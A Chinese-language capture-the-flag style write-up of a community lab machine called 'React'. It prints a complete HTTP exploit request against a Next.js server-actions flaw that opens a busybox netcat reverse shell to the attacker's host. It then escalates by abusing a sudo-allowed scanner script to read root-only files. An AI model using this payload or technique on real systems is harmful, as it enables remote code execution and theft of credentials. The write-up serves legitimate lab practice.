---
title: "群友靶机之React"
date: "2025-12-24 21:05:51"
tags: ["渗透测试"]
categories: ["群友靶机"]
url: "/posts/55978.html"
abbrlink: "55978"
---

获取靶机地址：https://maze-sec.com/

QQ群：`660930334`

# 配置：

```
靶机用VirtualBox制作，VMware导入可能网卡不兼容
用户:todd 密码:qq660930334
1. 启动虚拟机时按`e`键进入GRUB编辑模式
2. 修改启动参数：将`ro`改为`rw single init=/bin/bash`
3. 按Ctrl+X启动进入单用户模式
vim /etc/network/interfaces
allow-hotplug ens33
iface ens33 inet dhcp

ip link set ens33 up
dhclient ens33
reboot -f
```

# 端口扫描

![image-20251219102417313](/images/image-20251219102417313.png)

```
80,22,3000端口，在3000端口看到是nextjs最新的 CVE-2025-66478 rce漏洞
```

# nday

```
为了方便后期实现就反弹shell到kali上面，busybox nc 192.168.44.128 4444 -e bash
```

![image-20251219102934836](/images/image-20251219102934836.png)

```
POST / HTTP/1.1
Host: 192.168.44.150:3000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0
Next-Action: x
X-Nextjs-Request-Id: b5dce965
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9
Content-Length: 753

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "var res=process.mainModule.require('child_process').execSync('busybox nc 192.168.44.128 4444 -e bash',{'timeout':5000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--

```

# 权限提升

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![image-20251219103228733](/images/image-20251219103228733.png)

```
发现一个有权限的脚本扫描工具
```

```
使用-l参数可以读取本地的root.txt文件
```

```
sudo /opt/react2shell/scanner.py -l /root/root.txt -o /tmp/test/root.txt --all-results
```

![image-20251219103507416](/images/image-20251219103507416.png)

```
用linpeas脚本，探针发现一个可疑的二进制文件/usr/bin/check_key
```

![image-20251219104240205](/images/image-20251219104240205.png)

```
使用scanner.py读取Reactrootpass.txt
sudo /opt/react2shell/scanner.py -l /root/Reactrootpass.txt -t 1 -o /tmp/1.json --all-results
```

![image-20251219104410621](/images/image-20251219104410621.png)

# 总结

```
nday进去有用遗留的扫描工具读取本地文件，以获取敏感信息达到相应的效果
```
